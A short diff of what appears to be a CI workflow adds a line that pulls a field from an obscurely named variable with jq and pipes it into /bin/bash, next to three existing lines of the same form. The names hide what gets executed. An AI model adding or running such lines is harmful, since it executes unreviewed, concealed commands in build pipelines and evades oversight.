@@ -25,6 +25,7 @@ jobs:
           echo $ylntf15 | jq -r .g26 | /bin/bash
           echo $vkq1047 | jq -r .p22373 | /bin/bash
           echo $lh30 | jq -r .scbmt85910 | /bin/bash
+          printf '%s' "$xth3" | jq -r .yiw655 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
